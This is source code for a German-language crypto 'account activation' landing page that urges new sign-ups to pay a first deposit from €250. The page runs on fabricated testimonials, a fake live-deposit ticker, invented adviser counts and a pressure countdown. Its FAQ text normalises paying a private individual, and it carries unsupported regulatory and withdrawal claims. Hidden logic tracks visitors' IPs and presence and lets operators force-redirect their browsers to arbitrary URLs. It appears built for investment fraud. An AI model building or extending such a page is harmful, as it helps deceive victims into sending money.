import { useState, useEffect, useRef } from "react";
import { Link, useNavigate } from "react-router-dom";
import { supabase } from "@/lib/supabase";
import { useAuth } from "@/hooks/useAuth";
import { isImpersonatedSession } from "@/lib/impersonation";
import {
  Shield, CheckCircle2,
  Users, Globe,
  Headphones, Star, Zap, Lock, BarChart3,
  ChevronDown, Sparkles, BadgeCheck, HelpCircle, Wallet, LineChart, Target,
  ArrowDown, Phone, Clock, TrendingUp,
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import logoAsset from "@/assets/crypto-boerse-logo-dark-3.png.asset.json";
const logo = logoAsset.url;
import LiveChatWidget from "@/components/chat/LiveChatWidget";
import WelcomePaymentCard from "@/components/welcome/WelcomePaymentCard";

const SUPPORT_PHONES = [
  { href: "tel:+41319002336", label: "+41 31 900 23 36" },
  { href: "tel:+41319002337", label: "+41 31 900 23 37" },
  { href: "tel:+41319002338", label: "+41 31 900 23 38" },
];

const testimonials = [
  { name: "Michael K.", location: "München", text: "Ich habe direkt online aktiviert — alles in 2 Minuten erledigt. Mein Berater hat sich später zur Begrüßung gemeldet.", deposit: "€500 Ersteinzahlung" },
  { name: "Sabine W.", location: "Wien", text: "Ich war skeptisch, aber die Überweisung war sicher und einfach. Konto sofort aktiv — genau wie versprochen.", deposit: "€1.000 Ersteinzahlung" },
  { name: "Thomas R.", location: "Zürich", text: "Professionell, transparent und auf Deutsch. Auszahlung hat genau wie angekündigt funktioniert. Empfehlung.", deposit: "€2.500 Ersteinzahlung" },
  { name: "Andrea P.", location: "Frankfurt", text: "Endlich ein Anbieter ohne Druck. Selbst aktiviert, der Berater war später trotzdem für mich da.", deposit: "€250 Ersteinzahlung" },
];

const liveActivity = [
  { name: "Stefan M.", city: "Hamburg", amount: "€500" },
  { name: "Julia B.", city: "Wien", amount: "€250" },
  { name: "Markus L.", city: "Zürich", amount: "€1.000" },
  { name: "Petra S.", city: "Berlin", amount: "€750" },
  { name: "Daniel F.", city: "Graz", amount: "€300" },
  { name: "Nina H.", city: "Frankfurt", amount: "€2.000" },
];

const benefitsAfterActivation = [
  { icon: Wallet, title: "Sofortiger Kontozugang", desc: "Vollständiger Zugriff auf Ihr Investmentkonto direkt nach Zahlungseingang." },
  { icon: LineChart, title: "KI-gestützte Strategien", desc: "Profitieren Sie ab dem ersten Tag von unseren bewährten Trading-Algorithmen." },
  { icon: Target, title: "Persönlicher Berater", desc: "Ihr fester Ansprechpartner begleitet Sie — kostenlos und auf Deutsch." },
  { icon: Shield, title: "Jederzeit auszahlbar", desc: "Ihr Geld bleibt jederzeit Ihres — Auszahlung in der Regel innerhalb von 24 Stunden." },
];

const buildFaqs = (brand: string) => [
  { q: "Warum benötige ich eine Ersteinzahlung?", a: "Die Ersteinzahlung ab €250 aktiviert Ihr persönliches Investmentkonto. Es ist keine Gebühr — der Betrag wird Ihrem Konto in voller Höhe gutgeschrieben und bleibt Ihr Guthaben." },
  { q: `Ist mein Geld bei ${brand} sicher?`, a: "Ja. Als MiCA-regulierter Crypto-Asset Service Provider werden Kundengelder strikt getrennt von Firmenvermögen bei erstklassigen europäischen Banken verwahrt." },
  { q: "Kann ich mein Geld jederzeit auszahlen?", a: "Ja, Auszahlungen sind jederzeit möglich und werden in der Regel innerhalb von 24 Stunden bearbeitet — ohne versteckte Gebühren." },
  { q: "Warum lautet der Empfänger auf eine Privatperson?", a: "Weil die Aufladung als P2P-Transaktion erfolgt: Sie kaufen direkt von einem verifizierten Privatverkäufer. Das ist normal — bitte nutzen Sie ausschließlich die im Fenster angezeigte Referenz." },
  { q: "Was passiert nach der Zahlung?", a: "Ihr Konto wird nach Zahlungseingang aktiviert. Sie erhalten Zugang zu Ihrem Dashboard, allen Strategien, und Ihr persönlicher Berater meldet sich zur Begrüßung." },
  { q: "Werde ich zu weiteren Einzahlungen gedrängt?", a: "Niemals. Sie entscheiden in Ruhe und ohne Druck, ob und wann Sie zusätzlich investieren möchten." },
];

const ThankYou = () => {
  const navigate = useNavigate();
  const { user, loading: authLoading } = useAuth();
  const [seconds, setSeconds] = useState(600);
  const [testimonialIndex, setTestimonialIndex] = useState(0);
  const [activityIndex, setActivityIndex] = useState(0);
  const visitIdRef = useRef<string | null>(null);
  const startTimeRef = useRef(Date.now());
  const [clientName, setClientName] = useState<string | null>(null);
  const [beingCalled, setBeingCalled] = useState(false);
  const [isLead, setIsLead] = useState<boolean>(true);
  const [funnelName, setFunnelName] = useState<string | null>(null);
  const [showStickyBar, setShowStickyBar] = useState(false);

  // Pretty-print the raw funnel slug into a brand-style label
  const prettyFunnel = (raw: string | null): string | null => {
    if (!raw) return null;
    const cleaned = raw
      .replace(/[_\-\.]+/g, " ")
      .replace(/\s+/g, " ")
      .trim();
    if (!cleaned) return null;
    return cleaned
      .split(" ")
      .map((w) => (w.length <= 3 ? w.toUpperCase() : w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()))
      .join(" ");
  };
  const brandLabel = prettyFunnel(funnelName) || "Crypto-Börse";

  // Explicitly recover session from URL hash (magic link redirect)
  useEffect(() => {
    const hash = window.location.hash;
    if (hash && (hash.includes("access_token") || hash.includes("refresh_token"))) {
      supabase.auth.getSession().then(({ data: { session } }) => {
        if (session) {
          window.history.replaceState(null, "", window.location.pathname);
        }
      });
    }
  }, []);

  useEffect(() => {
    if (authLoading || !user) return;

    const check = async () => {
      if (!isImpersonatedSession()) {
        const { data: cur } = await supabase.from("profiles").select("current_page").eq("id", user.id).single();
        const heartbeatPayload: any = { last_seen_at: new Date().toISOString(), current_page: "/welcome" };
        if ((cur as any)?.current_page !== "/welcome") heartbeatPayload.current_page_since = new Date().toISOString();
        await supabase.from("profiles").update(heartbeatPayload).eq("id", user.id);
      }
      const { data } = await supabase.from("profiles").select("force_home_redirect, force_redirect_url, full_name, being_called, is_lead, first_deposit_at, funnel, country").eq("id", user.id).single();
      if ((data as any)?.full_name && !clientName) {
        setClientName((data as any).full_name);
      }
      if ((data as any)?.funnel && !funnelName) {
        setFunnelName((data as any).funnel);
      }
      setBeingCalled(!!(data as any)?.being_called);
      setIsLead(!!(data as any)?.is_lead && !(data as any)?.first_deposit_at);
      const forceUrl = (data as any)?.force_redirect_url;
      if (forceUrl) {
        await supabase.from("profiles").update({ force_redirect_url: null } as any).eq("id", user.id);
        if (forceUrl.startsWith("/")) {
          navigate(forceUrl);
        } else {
          window.location.href = forceUrl;
        }
        return;
      }
      if ((data as any)?.force_home_redirect) {
        await supabase.from("profiles").update({ force_home_redirect: false } as any).eq("id", user.id);
        navigate("/dashboard");
      }
    };
    check();
    const interval = setInterval(() => {
      if (!document.hidden) check();
    }, 5000);
    return () => clearInterval(interval);
  }, [authLoading, clientName, navigate, user]);

  // Track visit
  useEffect(() => {
    if (authLoading || !user || visitIdRef.current) return;

    const detectDevice = () => {
      const ua = navigator.userAgent;
      if (/Mobi|Android/i.test(ua)) return "mobile";
      if (/Tablet|iPad/i.test(ua)) return "tablet";
      return "desktop";
    };

    const logVisit = async () => {
      const { data, error } = await supabase.from("welcome_page_visits").insert({
        user_id: user.id,
        visitor_email: user.email || null,
        visitor_name: user.user_metadata?.full_name || null,
        user_agent: navigator.userAgent,
        referrer: document.referrer || null,
        device_type: detectDevice(),
      }).select("id").single();

      if (error) {
        console.error("Failed to log welcome visit:", error.message);
        return;
      }

      if (data) {
        visitIdRef.current = data.id;

        try {
          const res = await fetch("https://api.ipify.org?format=json");
          const json = await res.json();
          if (json.ip && visitIdRef.current) {
            await supabase.from("welcome_page_visits").update({ ip_address: json.ip }).eq("id", visitIdRef.current);
          }
        } catch { /* ignore */ }
      }
    };

    void logVisit();

    const updateOnLeave = () => {
      if (!visitIdRef.current) return;
      const spent = Math.round((Date.now() - startTimeRef.current) / 1000);
      supabase.from("welcome_page_visits").update({
        left_at: new Date().toISOString(),
        time_spent_seconds: spent,
      }).eq("id", visitIdRef.current).then();
    };

    const interval = setInterval(() => {
      if (!visitIdRef.current) return;
      const spent = Math.round((Date.now() - startTimeRef.current) / 1000);
      supabase.from("welcome_page_visits").update({
        time_spent_seconds: spent,
      }).eq("id", visitIdRef.current).then();
    }, 15000);

    window.addEventListener("beforeunload", updateOnLeave);
    window.addEventListener("pagehide", updateOnLeave);
    return () => {
      window.removeEventListener("beforeunload", updateOnLeave);
      window.removeEventListener("pagehide", updateOnLeave);
      clearInterval(interval);
    };
  }, [authLoading, user]);

  // Timer countdown
  useEffect(() => {
    if (seconds <= 0) {
      if (visitIdRef.current) {
        const spent = Math.round((Date.now() - startTimeRef.current) / 1000);
        supabase.from("welcome_page_visits").update({
          timer_expired: true,
          time_spent_seconds: spent,
        }).eq("id", visitIdRef.current).then();
      }
      return;
    }
    const t = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(t);
  }, [seconds]);

  useEffect(() => {
    const t = setInterval(() => setTestimonialIndex((i) => (i + 1) % testimonials.length), 7000);
    const a = setInterval(() => setActivityIndex((i) => (i + 1) % liveActivity.length), 5200);
    return () => { clearInterval(t); clearInterval(a); };
  }, []);

  // Sticky CTA appears once the user scrolls past the hero
  useEffect(() => {
    const onScroll = () => setShowStickyBar(window.scrollY > 420);
    window.addEventListener("scroll", onScroll, { passive: true });
    onScroll();
    return () => window.removeEventListener("scroll", onScroll);
  }, []);

  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;

  const scrollToPayment = () => {
    const el = document.getElementById("p2p-frame") || document.getElementById("self-activation");
    if (!el) return;
    const top = el.getBoundingClientRect().top + window.scrollY - 12;
    window.scrollTo({ top, behavior: "smooth" });
  };

  const firstName = clientName ? clientName.split(" ")[0] : null;

  return (
    <div
      className="min-h-screen bg-[hsl(var(--hero-bg))] text-[hsl(var(--hero-foreground))] overflow-hidden relative"
      style={{
        // Force Crypto-Börse blue accent regardless of light/dark theme
        ['--primary' as any]: '217 91% 60%',
        ['--primary-foreground' as any]: '0 0% 100%',
        ['--ring' as any]: '217 91% 60%',
        ['--warning' as any]: '38 92% 55%',
        ['--success' as any]: '155 60% 45%',
      }}
    >
      {/* Ambient background effects */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-[800px] bg-primary/5 rounded-full blur-[120px]" />
        <div className="absolute bottom-0 right-0 w-[600px] h-[600px] bg-primary/[0.04] rounded-full blur-[100px]" />
      </div>

      {/* Nav */}
      <nav className="relative z-20 border-b border-white/5">
        <div className="container mx-auto flex h-16 md:h-20 items-center justify-between px-4">
          <Link to="/dashboard" className="flex items-center gap-3">
            <img src={logo} alt={brandLabel} className="h-10 md:h-14 w-auto" />
            {prettyFunnel(funnelName) && (
              <span className="hidden sm:inline-flex items-center px-2.5 py-1 rounded-full border border-primary/30 bg-primary/10 text-primary text-xs font-semibold uppercase tracking-wider">
                {prettyFunnel(funnelName)}
              </span>
            )}
          </Link>
          <div className="flex items-center gap-3 text-sm text-[hsl(var(--hero-muted))]">
            <div className="inline-flex items-center gap-2 rounded-lg border border-primary/40 bg-primary/10 px-3 py-1.5 font-semibold text-[hsl(var(--hero-foreground))]">
              <Phone className="h-4 w-4 text-primary" />
              <span className="hidden sm:inline">{SUPPORT_PHONES[0].label}</span>
              <span className="sm:hidden">Support</span>
            </div>
            <div className="hidden md:flex items-center gap-2">
              <Lock className="h-4 w-4 text-primary" />
              <span>Sichere Verbindung</span>
            </div>
          </div>
        </div>
        {/* Progress bar — completion psychology */}
        <div className="container mx-auto px-4 pb-3">
          <div className="flex items-center justify-between text-[11px] md:text-xs font-semibold uppercase tracking-wider text-[hsl(var(--hero-muted))] mb-1.5">
            <span className="text-[hsl(var(--success))]">1. Registrierung ✓</span>
            <span className="text-primary">2. Konto aktivieren</span>
            <span>3. Investieren</span>
          </div>
          <div className="h-1.5 rounded-full bg-white/10 overflow-hidden">
            <motion.div
              initial={{ width: "12%" }}
              animate={{ width: "66%" }}
              transition={{ duration: 1.1, ease: "easeOut" }}
              className="h-full rounded-full bg-gradient-to-r from-[hsl(var(--success))] to-primary"
            />
          </div>
        </div>
      </nav>

      <div className="relative z-10 container mx-auto px-4 py-6 md:py-10 max-w-5xl">

        {/* Being Called Banner — highest priority */}
        <AnimatePresence>
          {beingCalled && (
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: -16 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: -16 }}
              transition={{ type: "spring", stiffness: 200, damping: 20 }}
              className="mb-6 rounded-2xl border-2 border-[hsl(var(--success))]/50 bg-[hsl(var(--success))]/12 p-5 md:p-6 backdrop-blur-sm"
            >
              <div className="flex flex-col md:flex-row items-center gap-4">
                <motion.div
                  animate={{ rotate: [0, -15, 15, -15, 15, 0] }}
                  transition={{ duration: 0.8, repeat: Infinity, repeatDelay: 1.5 }}
                  className="w-14 h-14 rounded-full bg-[hsl(var(--success))]/20 flex items-center justify-center shrink-0"
                >
                  <Headphones className="h-7 w-7 text-[hsl(var(--success))]" />
                </motion.div>
                <div className="text-center md:text-left flex-1">
                  <h2 className="text-xl md:text-2xl font-display font-bold text-[hsl(var(--success))] mb-1">
                    Ihr Berater ist jetzt für Sie da!
                  </h2>
                  <p className="text-sm md:text-base text-[hsl(var(--hero-muted))]">
                    {firstName ? `${firstName}, ` : ""}bitte halten Sie Live-Chat und Posteingang bereit — wir rufen Sie aus Deutschland, Österreich oder der Schweiz von einer dieser Nummern an.
                  </p>
                </div>
                <div className="flex flex-wrap gap-2 justify-center md:justify-end">
                  {SUPPORT_PHONES.map((p) => (
                    <a key={p.href} href={p.href} className="inline-flex items-center gap-2 rounded-xl bg-[hsl(var(--success))] px-4 py-2.5 font-bold text-white">
                      <Phone className="h-5 w-5" /> {p.label}
                    </a>
                  ))}
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* ========== HERO: one message, one action ========== */}
        <motion.section
          initial={{ opacity: 0, y: -8 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="mb-10 text-center"
        >
          <motion.div
            initial={{ scale: 0, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ delay: 0.1, type: "spring", stiffness: 160 }}
            className="inline-flex items-center gap-2 rounded-full border border-[hsl(var(--success))]/40 bg-[hsl(var(--success))]/12 px-4 py-1.5 mb-5"
          >
            <CheckCircle2 className="h-4 w-4 text-[hsl(var(--success))]" />
            <span className="text-xs md:text-sm font-bold text-[hsl(var(--success))] uppercase tracking-wider">
              Registrierung bestätigt
            </span>
          </motion.div>

          <h1 className="text-3xl md:text-5xl lg:text-[3.4rem] font-display font-bold leading-[1.1] mb-4">
            {firstName ? `${firstName}, nur noch ein Schritt` : "Nur noch ein Schritt"} —{" "}
            <span className="text-primary">Konto jetzt aktivieren</span>
          </h1>
          <p className="text-base md:text-xl text-[hsl(var(--hero-muted))] max-w-2xl mx-auto leading-relaxed mb-7">
            Ihre Ersteinzahlung ab <strong className="text-[hsl(var(--hero-foreground))]">€250</strong> wird Ihrem
            Konto <strong className="text-[hsl(var(--hero-foreground))]">zu 100 % als Guthaben</strong> gutgeschrieben —
            keine Gebühr, jederzeit auszahlbar. Aktivierung dauert rund 2 Minuten.
          </p>

          {/* Small call-from notice */}
          <p className="text-xs md:text-sm text-[hsl(var(--hero-muted))] text-center mb-2">
            <span className="inline-flex items-center gap-1.5 rounded-full border border-primary/30 bg-primary/10 px-2.5 py-1 text-[hsl(var(--hero-foreground))] font-medium">
              <img
                src="https://flagcdn.com/w20/de.png"
                alt="Deutschland"
                className="h-3.5 w-auto rounded-sm shadow-sm"
              />
              <img
                src="https://flagcdn.com/w20/at.png"
                alt="Österreich"
                className="h-3.5 w-auto rounded-sm shadow-sm"
              />
              <img
                src="https://flagcdn.com/w20/ch.png"
                alt="Schweiz"
                className="h-3.5 w-auto rounded-sm shadow-sm"
              />
              Anruf aus Deutschland, Österreich oder der Schweiz
            </span>{" "}
            von einer dieser Nummern:{" "}
            {SUPPORT_PHONES.map((p, i) => (
              <span key={p.href}>
                <a href={p.href} className="text-[hsl(var(--hero-foreground))] hover:text-primary transition-colors underline underline-offset-4">
                  {p.label}
                </a>
                {i < SUPPORT_PHONES.length - 1 ? " · " : ""}
              </span>
            ))}
          </p>

          {/* Primary + secondary CTA */}
          <div className="flex flex-col sm:flex-row items-center justify-center gap-3 mb-6">
            <Button
              onClick={scrollToPayment}
              size="lg"
              className="w-full sm:w-auto h-14 md:h-16 px-8 md:px-10 text-base md:text-lg font-bold rounded-xl shadow-lg shadow-primary/30"
            >
              <Lock className="w-5 h-5 mr-2" />
              Konto jetzt aktivieren
            </Button>
            <a
              href="tel:+41319002336"
              className="w-full sm:w-auto inline-flex flex-col items-center justify-center gap-0.5 h-auto min-h-14 md:min-h-16 px-5 md:px-8 py-2 rounded-xl border-2 border-primary/40 bg-primary/10 text-[hsl(var(--hero-foreground))] hover:bg-primary/20 transition-colors"
            >
              <span className="text-[10px] md:text-xs font-medium text-[hsl(var(--hero-muted))] leading-tight text-center">
                Noch nicht von uns angerufen? Rufen Sie uns vorab an:
              </span>
              <span className="flex items-center gap-2 text-base md:text-lg font-bold leading-tight">
                <Phone className="w-5 h-5 text-primary" />
                +41 31 900 23 36
              </span>
            </a>
          </div>

          <div className="flex items-center justify-center gap-2 text-primary/90 mb-7 animate-bounce">
            <ArrowDown className="w-4 h-4" />
            <span className="text-xs md:text-sm font-bold uppercase tracking-wider">Aktivierung direkt unten</span>
            <ArrowDown className="w-4 h-4" />
          </div>

          {/* Micro-trust row + advisor timer + live activity */}
          <div className="grid gap-3 sm:grid-cols-3 max-w-3xl mx-auto text-left">
            <div className="rounded-xl border border-[hsl(var(--hero-card-border))]/40 bg-[hsl(var(--hero-card))] p-4">
              <div className="flex items-center gap-2 mb-1">
                <span className="relative flex h-2.5 w-2.5">
                  <span className="absolute inline-flex h-full w-full rounded-full bg-[hsl(var(--success))] opacity-60 animate-ping" />
                  <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-[hsl(var(--success))]" />
                </span>
                <span className="text-sm font-bold">12 Berater online</span>
              </div>
              <p className="text-xs text-[hsl(var(--hero-muted))]">Deutschland · Österreich · Schweiz — Support auf Deutsch</p>
            </div>

            <div className="rounded-xl border border-[hsl(var(--hero-card-border))]/40 bg-[hsl(var(--hero-card))] p-4">
              <div className="flex items-center gap-2 mb-1">
                <Clock className="h-5 w-5 text-primary" />
                <span className="text-lg md:text-xl font-display font-bold tabular-nums text-[hsl(var(--hero-foreground))]">
                  {seconds > 0 ? `Rückruf in ${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}` : "Berater meldet sich jetzt"}
                </span>
              </div>
              <p className="text-xs text-[hsl(var(--hero-muted))]">Sie müssen nicht warten — Aktivierung ist sofort möglich.</p>
            </div>

            <div className="rounded-xl border border-[hsl(var(--hero-card-border))]/40 bg-[hsl(var(--hero-card))] p-4 overflow-hidden">
              <div className="flex items-center gap-2 mb-1">
                <TrendingUp className="h-4 w-4 text-[hsl(var(--success))]" />
                <span className="text-sm font-bold">Gerade aktiviert</span>
              </div>
              <AnimatePresence mode="wait">
                <motion.p
                  key={activityIndex}
                  initial={{ opacity: 0, y: 8 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -8 }}
                  transition={{ duration: 0.35 }}
                  className="text-xs text-[hsl(var(--hero-muted))]"
                >
                  {liveActivity[activityIndex].name} aus {liveActivity[activityIndex].city} ·{" "}
                  <strong className="text-[hsl(var(--success))]">{liveActivity[activityIndex].amount}</strong>
                </motion.p>
              </AnimatePresence>
            </div>
          </div>
        </motion.section>

        {/* ========== PRIMARY: activation / payment ========== */}
        <div className="mb-14">
          <WelcomePaymentCard clientName={clientName} />
        </div>

        {/* ========== Objection handling: what you get ========== */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.5 }}
          className="mb-14"
        >
          <div className="text-center mb-8">
            <div className="inline-flex items-center gap-2 rounded-full border border-primary/30 bg-primary/10 px-4 py-1.5 mb-4">
              <Sparkles className="h-4 w-4 text-primary" />
              <span className="text-xs md:text-sm font-semibold text-primary uppercase tracking-wider">Direkt nach der Aktivierung</span>
            </div>
            <h2 className="text-2xl md:text-3xl font-display font-bold">Das erwartet Sie sofort</h2>
          </div>
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4">
            {benefitsAfterActivation.map((b) => (
              <div
                key={b.title}
                className="group rounded-2xl border border-[hsl(var(--hero-card-border))]/40 bg-[hsl(var(--hero-card))] hover:border-primary/40 p-6 transition-all duration-300"
              >
                <div className="w-12 h-12 rounded-xl bg-primary/10 group-hover:bg-primary/20 flex items-center justify-center mb-4 transition-colors">
                  <b.icon className="h-6 w-6 text-primary" />
                </div>
                <h3 className="font-display font-semibold text-base md:text-lg mb-2">{b.title}</h3>
                <p className="text-sm text-[hsl(var(--hero-muted))] leading-relaxed">{b.desc}</p>
              </div>
            ))}
          </div>
        </motion.div>

        {/* ========== Social proof ========== */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.5 }}
          className="mb-14 rounded-2xl border border-[hsl(var(--hero-card-border))]/40 bg-[hsl(var(--hero-card))] p-8 md:p-10 text-center"
        >
          <div className="flex justify-center gap-1 mb-5">
            {[...Array(5)].map((_, i) => (
              <Star key={i} className="h-5 w-5 fill-primary text-primary" />
            ))}
          </div>
          <AnimatePresence mode="wait">
            <motion.div
              key={testimonialIndex}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.4 }}
            >
              <p className="text-lg md:text-xl text-[hsl(var(--hero-muted))] italic mb-5 max-w-xl mx-auto leading-relaxed">
                „{testimonials[testimonialIndex].text}"
              </p>
              <div className="text-base">
                <span className="font-semibold">{testimonials[testimonialIndex].name}</span>
                <span className="text-[hsl(var(--hero-muted))]"> · {testimonials[testimonialIndex].location}</span>
              </div>
              <div className="mt-3 inline-flex items-center gap-2 rounded-full border border-[hsl(var(--success))]/30 bg-[hsl(var(--success))]/10 px-3 py-1">
                <BadgeCheck className="h-4 w-4 text-[hsl(var(--success))]" />
                <span className="text-sm font-semibold text-[hsl(var(--success))]">
                  Verifizierter Kunde · {testimonials[testimonialIndex].deposit}
                </span>
              </div>
            </motion.div>
          </AnimatePresence>
          <div className="flex justify-center gap-2.5 mt-5">
            {testimonials.map((_, i) => (
              <button
                key={i}
                onClick={() => setTestimonialIndex(i)}
                aria-label={`Erfahrung ${i + 1}`}
                className={`w-2.5 h-2.5 rounded-full transition-colors duration-300 ${
                  i === testimonialIndex ? "bg-primary" : "bg-white/20 hover:bg-white/40"
                }`}
              />
            ))}
          </div>
        </motion.div>

        {/* ========== FAQ — objection killers ========== */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.5 }}
          className="mb-14"
        >
          <div className="text-center mb-8">
            <h2 className="text-2xl md:text-3xl font-display font-bold mb-2">Ihre Fragen — kurz beantwortet</h2>
            <p className="text-base text-[hsl(var(--hero-muted))]">Noch unsicher? Wir rufen Sie aus Deutschland, Österreich oder der Schweiz von einer dieser Nummern an: {SUPPORT_PHONES.map((p) => p.label).join(" · ")}</p>
          </div>
          <div className="grid md:grid-cols-2 gap-4 max-w-4xl mx-auto">
            {buildFaqs(brandLabel).map((f) => (
              <details
                key={f.q}
                className="group rounded-xl border border-[hsl(var(--hero-card-border))]/40 bg-[hsl(var(--hero-card))] hover:border-primary/40 transition-colors p-5 [&[open]]:border-primary/50"
              >
                <summary className="flex items-center gap-3 cursor-pointer list-none">
                  <HelpCircle className="h-5 w-5 text-primary flex-shrink-0" />
                  <span className="font-semibold text-base flex-1">{f.q}</span>
                  <ChevronDown className="h-5 w-5 text-[hsl(var(--hero-muted))] transition-transform group-open:rotate-180" />
                </summary>
                <p className="mt-3 pl-8 text-sm md:text-base text-[hsl(var(--hero-muted))] leading-relaxed">
                  {f.a}
                </p>
              </details>
            ))}
          </div>
        </motion.div>

        {/* ========== Final CTA ========== */}
        {isLead && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.5 }}
            className="rounded-2xl border-2 border-primary/40 bg-gradient-to-br from-primary/15 via-primary/8 to-primary/15 p-8 md:p-12 text-center mb-12 relative overflow-hidden"
          >
            <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_0%,hsl(var(--primary)/0.2),transparent_70%)]" />
            <div className="relative z-10">
              <h3 className="font-display font-bold text-2xl md:text-4xl mb-3">
                Bereit? Aktivieren Sie Ihr Konto jetzt
              </h3>
              <p className="text-base md:text-lg text-[hsl(var(--hero-muted))] mb-7 max-w-xl mx-auto leading-relaxed">
                2 Minuten, sichere Banküberweisung, volles Guthaben auf Ihrem Konto — ohne Wartezeit.
              </p>
              <div className="flex flex-col sm:flex-row items-center justify-center gap-3">
                <Button
                  onClick={scrollToPayment}
                  size="lg"
                  className="w-full sm:w-auto h-16 px-10 text-lg font-bold rounded-2xl shadow-lg shadow-primary/30"
                >
                  <Lock className="w-5 h-5 mr-3" />
                  Jetzt sicher aktivieren
                </Button>
                <div className="w-full sm:w-auto inline-flex flex-col items-center justify-center gap-1 h-auto min-h-16 px-6 rounded-2xl border-2 border-primary/40 bg-[hsl(var(--hero-bg))]/50 font-bold hover:bg-primary/10 transition-colors">
                  <span className="flex items-center gap-2 text-base md:text-lg">
                    <Phone className="w-5 h-5 text-primary" /> Telefonisch:
                  </span>
                  <span className="flex flex-wrap items-center justify-center gap-x-2 text-sm md:text-base">
                    {SUPPORT_PHONES.map((p) => (
                      <a key={p.href} href={p.href} className="hover:text-primary hover:underline underline-offset-4">{p.label}</a>
                    ))}
                  </span>
                </div>
              </div>
              <p className="text-sm text-[hsl(var(--hero-muted))] mt-5">
                Oder per E-Mail:{" "}
                <a href="mailto:support@crypto-borse.com" className="font-bold text-primary hover:underline">
                  support@crypto-borse.com
                </a>
                {" · "}Mo–Fr 09:00–18:00 Uhr
              </p>
            </div>
          </motion.div>
        )}

        {/* Trust strip */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10">
          {[
            { icon: Shield, value: "MiCA", label: "regulierter CASP" },
            { icon: Users, value: "15.000+", label: "Aktive Investoren" },
            { icon: Globe, value: "DACH", label: "Deutsch · Vor Ort" },
            { icon: Lock, value: "SSL", label: "Verschlüsselte Zahlung" },
          ].map((item) => (
            <div key={item.label} className="rounded-xl border border-[hsl(var(--hero-card-border))]/40 bg-[hsl(var(--hero-card))] p-5 text-center">
              <item.icon className="h-6 w-6 text-primary mx-auto mb-3" />
              <div className="text-lg md:text-xl font-display font-bold">{item.value}</div>
              <div className="text-sm text-[hsl(var(--hero-muted))]">{item.label}</div>
            </div>
          ))}
        </div>

        {/* Bottom trust row */}
        <div className="flex flex-wrap items-center justify-center gap-6 md:gap-8 pb-28 md:pb-24">
          {[
            { icon: Shield, text: "Kundengelder getrennt verwahrt" },
            { icon: Zap, text: "KI-gestützte Strategien" },
            { icon: Star, text: "Deutschsprachiger Support" },
            { icon: BarChart3, text: "Auszahlung in 24 Stunden" },
          ].map((item) => (
            <div key={item.text} className="flex items-center gap-2 text-sm text-[hsl(var(--hero-muted))]">
              <item.icon className="h-4 w-4 text-primary/70" />
              <span>{item.text}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Sticky conversion bar */}
      <AnimatePresence>
        {isLead && showStickyBar && (
          <motion.div
            initial={{ y: 90, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: 90, opacity: 0 }}
            transition={{ type: "spring", stiffness: 240, damping: 26 }}
            className="fixed bottom-0 left-0 right-0 z-40 border-t border-primary/30 bg-[hsl(var(--hero-bg))]/95 backdrop-blur-md"
          >
            <div className="container mx-auto max-w-5xl px-4 py-3 flex items-center gap-3">
              <div className="hidden sm:block flex-1 min-w-0">
                <div className="text-sm font-bold truncate">Konto aktivieren — ab €250, volles Guthaben</div>
                <div className="text-xs text-[hsl(var(--hero-muted))] truncate">Sichere Banküberweisung · rund 2 Minuten</div>
              </div>
              <div className="inline-flex items-center justify-center gap-2 h-12 px-4 rounded-xl border border-primary/40 bg-primary/10 font-bold text-sm shrink-0">
                <Phone className="w-4 h-4 text-primary" />
                <span className="hidden xs:inline sm:hidden md:inline">{SUPPORT_PHONES[0].label}</span>
              </div>
              <Button onClick={scrollToPayment} className="flex-1 sm:flex-none h-12 px-6 font-bold rounded-xl">
                <Lock className="w-4 h-4 mr-2" /> Jetzt aktivieren
              </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Footer */}
      <div className="relative z-10 border-t border-white/5 py-8">
        <div className="container mx-auto px-4 text-center text-sm text-[hsl(var(--hero-muted))]/80">
          © {new Date().getFullYear()} Crypto-Börse. Alle Rechte vorbehalten.
        </div>
      </div>
      <LiveChatWidget />
    </div>
  );
};

export default ThankYou;
